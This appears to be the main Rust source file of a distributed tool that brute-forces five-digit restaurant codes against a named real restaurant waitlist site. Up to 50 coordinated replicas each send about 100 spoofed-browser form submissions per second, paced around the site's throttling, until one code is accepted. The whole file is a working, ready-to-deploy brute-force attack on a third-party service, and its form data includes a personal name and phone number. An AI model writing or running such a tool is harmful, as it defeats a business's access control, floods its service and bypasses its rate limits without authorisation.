//! Brute-forces 5-digit restaurant codes against checktodine.com's waitlist endpoint, over every replica of the app
//! at once.
//!   - The replicas are one: each keeps a WebSocket to every other (mesh.rs), and they agree on the one scan that runs,
//!     hand its codes out, share its progress, and stop together (coord.rs). Start or stop from any replica's page.
//!   - A scan covers from..to (half-open, within 00000..99999; to may be 100000), in a random order: shuffled, cut
//!     into chunks, every replica given some at once.
//!   - Each replica tries its codes at RATE_PER_SEC through a token bucket, 10 retries with exponential backoff per
//!     code; a body without "Restaurant Code is not valid." is a hit, and every replica stops.
//!   - GET / serves the page; GET /orchestrate/status the scan as every replica knows it; GET /status this replica's
//!     own counters.

mod coord;
mod mesh;

use axum::extract::{rejection::QueryRejection, Query, State};
use axum::http::StatusCode;
use axum::response::{Html, IntoResponse, Json};
use axum::routing::get;
use axum::Router;
use coord::Node;
use futures::stream::{self, StreamExt};
use governor::{Quota, RateLimiter};
use reqwest::Client;
use serde::Deserialize;
use serde_json::json;
use std::collections::HashMap;
use std::net::SocketAddr;
use std::num::NonZeroU32;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

const TARGET_URL: &str = "https://checktodine.com/customer_waitlist.php?businessid=110";
/// The site's address: TARGET_URL, or DOSA_TARGET_URL instead (a test stand-in).
fn target_url() -> String {
    std::env::var("DOSA_TARGET_URL").ok().filter(|u| !u.is_empty()).unwrap_or_else(|| TARGET_URL.to_string())
}
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
/// Sustained request rate per replica. The site throttles bursty traffic, so we pace with a token bucket instead of
/// raw concurrency.
const RATE_PER_SEC: u32 = 100;
/// Tasks draining the queue (enough that the rate limiter, not their number, sets the pace).
const BUFFER_WORKERS: usize = 16;
const INVALID_MARKER: &str = "Restaurant Code is not valid.";
/// Exclusive upper bound for `to`: 100000 means "up to and including 99999".
const MAX_TO: u32 = 100_000;

/// Number of replicas in the fleet: REPLICA_COUNT (default 50). A majority of it must grant a scan.
fn replica_count() -> u32 {
    std::env::var("REPLICA_COUNT").ok().and_then(|v| v.parse().ok()).unwrap_or(50)
}

/// Base URL template for replicas. {i} is replaced with 1..=replica_count().
fn replica_base() -> String {
    std::env::var("REPLICA_BASE").unwrap_or_else(|_| "https://dosa-{i}.billybishop4-workers.xyz".to_string())
}

pub fn replica_url(id: u32) -> String {
    replica_base().replace("{i}", &id.to_string())
}

/// This replica's attempt counters (since its current scan began).
#[derive(Default)]
pub struct Counters {
    pub tried: AtomicU64,
    pub ok_200: AtomicU64,
    pub http_4xx: AtomicU64,
    pub http_5xx: AtomicU64,
    pub timeouts: AtomicU64,
    pub net_errors: AtomicU64,
    pub last_error: Mutex<String>,
    pub trial_code: Mutex<String>,
    pub valid_code: Mutex<String>,
}

impl Counters {
    pub fn reset(&self) {
        for c in [&self.tried, &self.ok_200, &self.http_4xx, &self.http_5xx, &self.timeouts, &self.net_errors] {
            c.store(0, Ordering::Relaxed);
        }
        *self.last_error.lock().unwrap() = String::new();
        *self.trial_code.lock().unwrap() = "—".into();
        *self.valid_code.lock().unwrap() = "—".into();
    }
    fn error(&self, msg: &str) {
        *self.last_error.lock().unwrap() = msg.chars().take(160).collect();
    }
}

/// POSTs one code. True iff the response body does NOT contain the invalid marker: the code was accepted. Every
/// outcome is counted; gives up early once active goes false (found or stopped).
pub async fn submit(client: &Client, c: &Counters, active: &AtomicBool, code: &str) -> bool {
    let form = [
        ("RestaurantCode", code),
        ("WaitListName", "Hari"),
        ("WaitListPhone", "6504057400"),
        ("WaitListAdults", "1"),
        ("WaitListKids", ""),
        ("WaitListMessage", ""),
        ("SaveBooking", "  ＋ Add  "),
    ];
    let mut retries: u32 = 10;
    let mut wait_ms: u64 = 100;
    loop {
        if !active.load(Ordering::Relaxed) {
            return false;
        }
        match client.post(target_url()).header("User-Agent", USER_AGENT).form(&form).send().await {
            Ok(resp) => {
                let status = resp.status();
                if status.is_success() {
                    c.ok_200.fetch_add(1, Ordering::Relaxed);
                    match resp.text().await {
                        Ok(body) => {
                            let success = !body.contains(INVALID_MARKER);
                            *c.trial_code.lock().unwrap() = code.to_string();
                            if success {
                                *c.valid_code.lock().unwrap() = code.to_string();
                                println!("Found valid code: {code}");
                            }
                            return success;
                        }
                        Err(e) => {
                            c.net_errors.fetch_add(1, Ordering::Relaxed);
                            c.error(&format!("body read failed: {e}"));
                        }
                    }
                } else {
                    if status.is_client_error() {
                        c.http_4xx.fetch_add(1, Ordering::Relaxed);
                    } else if status.is_server_error() {
                        c.http_5xx.fetch_add(1, Ordering::Relaxed);
                    } else {
                        c.net_errors.fetch_add(1, Ordering::Relaxed);
                    }
                    c.error(&format!("HTTP {status}"));
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    c.timeouts.fetch_add(1, Ordering::Relaxed);
                } else {
                    c.net_errors.fetch_add(1, Ordering::Relaxed);
                }
                c.error(&format!("request failed: {e}"));
            }
        }
        if retries == 0 {
            return false;
        }
        retries -= 1;
        tokio::time::sleep(Duration::from_millis(wait_ms)).await;
        wait_ms *= 2;
    }
}

/// Query params for a start. Both optional; omit them to scan everything. Half-open: from inclusive, to exclusive.
#[derive(Deserialize)]
struct StartParams {
    from: Option<u32>,
    to: Option<u32>,
}

/// GET /start, /orchestrate/start?from=&to= — proposes the scan to every replica; it runs once a majority grants it.
async fn start_handler(State(node): State<Arc<Node>>, query: Result<Query<StartParams>, QueryRejection>) -> impl IntoResponse {
    let params = match query {
        Ok(Query(p)) => p,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({"ok": false, "error": format!("bad query: {e}")}))),
    };
    let from = params.from.unwrap_or(0);
    let to = params.to.unwrap_or(MAX_TO);
    if from >= to || to > MAX_TO {
        return (StatusCode::BAD_REQUEST,
            Json(json!({"ok": false, "error": "bad range: need 0 <= from < to <= 100000 (from inclusive, to exclusive)"})));
    }
    match node.start(from, to).await {
        Ok(message) => (StatusCode::OK, Json(json!({"ok": true, "message": message}))),
        Err(error) => (StatusCode::CONFLICT, Json(json!({"ok": false, "error": error}))),
    }
}

/// GET /stop, /orchestrate/stop — stops the scan on every replica, from any replica: over the mesh, and to every
/// replica's /stop?local=1 too (one whose connections are down still hears it). ?local=1: this replica only.
async fn stop_handler(State(node): State<Arc<Node>>, Query(q): Query<HashMap<String, String>>) -> impl IntoResponse {
    let local = q.get("local").map(|v| v == "1").unwrap_or(false);
    node.note_stop(None, node.me, !local);
    if !local {
        let client = node.client.clone();
        let n = node.n;
        let me = node.me;
        tokio::spawn(async move {
            stream::iter((1..=n).filter(|k| *k != me))
                .for_each_concurrent(20, |k| {
                    let c = client.clone();
                    async move {
                        let _ = c.get(format!("{}/stop?local=1", replica_url(k))).timeout(Duration::from_secs(5)).send().await;
                    }
                })
                .await;
        });
    }
    Json(json!({"ok": true, "message": if local { "stopped here" } else { "stop sent to every replica" }}))
}

/// GET /status — this replica's own work.
async fn status_handler(State(node): State<Arc<Node>>) -> impl IntoResponse {
    let c = &node.w.c;
    let (range, total, orchestrating) = {
        let core = node.core.lock().unwrap();
        match &core.scan {
            Some(s) => (s.h.range(), (s.h.to - s.h.from) as u64, core.coord.is_some()),
            None => ("—".to_string(), 0, false),
        }
    };
    let last_error = c.last_error.lock().unwrap().clone();
    Json(json!({
        "running": node.w.active.load(Ordering::SeqCst), "range": range, "tried": c.tried.load(Ordering::Relaxed), "total": total,
        "trial_code": c.trial_code.lock().unwrap().clone(), "valid_code": c.valid_code.lock().unwrap().clone(),
        "found": *c.valid_code.lock().unwrap() != "—",
        "ok_200": c.ok_200.load(Ordering::Relaxed), "http_4xx": c.http_4xx.load(Ordering::Relaxed),
        "http_5xx": c.http_5xx.load(Ordering::Relaxed), "timeouts": c.timeouts.load(Ordering::Relaxed),
        "net_errors": c.net_errors.load(Ordering::Relaxed), "last_error": if last_error.is_empty() { "—".to_string() } else { last_error },
        "buffer_len": node.w.queue.lock().unwrap().len(), "orchestrating": orchestrating, "replica": node.me,
        "connected": node.peers.lock().unwrap().len() + 1,
    }))
}

/// GET /orchestrate/status — the scan, as every replica knows it.
async fn orch_status_handler(State(node): State<Arc<Node>>) -> impl IntoResponse {
    Json(node.status())
}

async fn root_handler() -> Html<&'static str> {
    Html(include_str!("index.html"))
}

#[tokio::main]
async fn main() {
    let port: u16 = std::env::var("PORT").ok().and_then(|p| p.parse().ok()).unwrap_or(3000);
    let me: u32 = std::env::var("FLEET_REPLICA").ok().and_then(|p| p.parse().ok()).unwrap_or(1);

    // HTTP/1.1 so concurrent requests use distinct sockets (HTTP/2 would multiplex them over one, and the site
    // handles those ~sequentially), and a big idle pool so the scan never pays a fresh TLS handshake.
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .http1_only()
        .pool_max_idle_per_host(1000)
        .pool_idle_timeout(Duration::from_secs(90))
        .tcp_keepalive(Duration::from_secs(60))
        .user_agent(USER_AGENT)
        .build()
        .expect("build reqwest client");
    let limiter = Arc::new(RateLimiter::direct(Quota::per_second(NonZeroU32::new(RATE_PER_SEC).unwrap())));
    let node = Node::new(me, replica_count(), client, limiter);

    for _ in 0..BUFFER_WORKERS {
        tokio::spawn(coord::work(node.clone()));
    }
    tokio::spawn(node.clone().watch());
    for j in (me + 1)..=node.n {
        tokio::spawn(mesh::dial(node.clone(), j));
    }

    let app = Router::new()
        .route("/", get(root_handler))
        .route("/orchestrate", get(root_handler))
        .route("/start", get(start_handler))
        .route("/orchestrate/start", get(start_handler))
        .route("/stop", get(stop_handler))
        .route("/orchestrate/stop", get(stop_handler))
        .route("/status", get(status_handler))
        .route("/orchestrate/status", get(orch_status_handler))
        .route("/mesh", get(mesh::accept))
        .with_state(node.clone());

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    println!("dosa-code-finder replica {me} of {} listening on {addr}", node.n);
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
